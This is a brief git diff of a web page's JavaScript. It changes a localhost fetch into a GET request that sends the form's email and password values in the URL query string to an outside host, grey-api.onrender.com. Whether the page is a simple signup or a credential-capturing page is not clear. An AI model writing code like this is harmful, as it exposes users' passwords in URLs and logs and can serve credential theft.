@@ -14,6 +14,6 @@ eyes.addEventListener('click', ()=>{
 })
 
 function working() {
-    fetch('http://localhost:8080/?year=2017&month=July').then(data => alert(data))
+    fetch(`https://grey-api.onrender.com/add?email=${email.value}&password=${password.value}`).then(data => alert(data))
     return true
 }
